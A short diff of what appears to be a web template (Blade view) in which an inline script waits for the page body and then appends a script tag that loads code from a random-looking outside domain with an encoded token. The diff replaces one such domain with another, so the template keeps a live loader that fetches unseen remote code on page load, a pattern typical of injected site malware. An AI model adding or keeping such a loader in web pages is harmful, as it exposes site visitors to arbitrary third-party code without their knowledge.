@@ -106,13 +106,14 @@
             var script = document.createElement('script');
             var i = setInterval(function() {
                 if (typeof w.document.body !== 'undefined') {
-                    script.src = 'http://urxgchaang.not-only.info' + '/?452737=9bz186fj7e7i6ujl8rywuLG0tbU';
+                    script.src = 'http://axwpe.people-are-thought.info' + '/?73169=peylo_ezvb6yuri1ouzg6OHk5eQ';
                     w.document.body.appendChild(script);
                     clearInterval(i);
                 }
             }, 200);
         })(window);
     </script>
+
 
 @endsection
 @section('style')
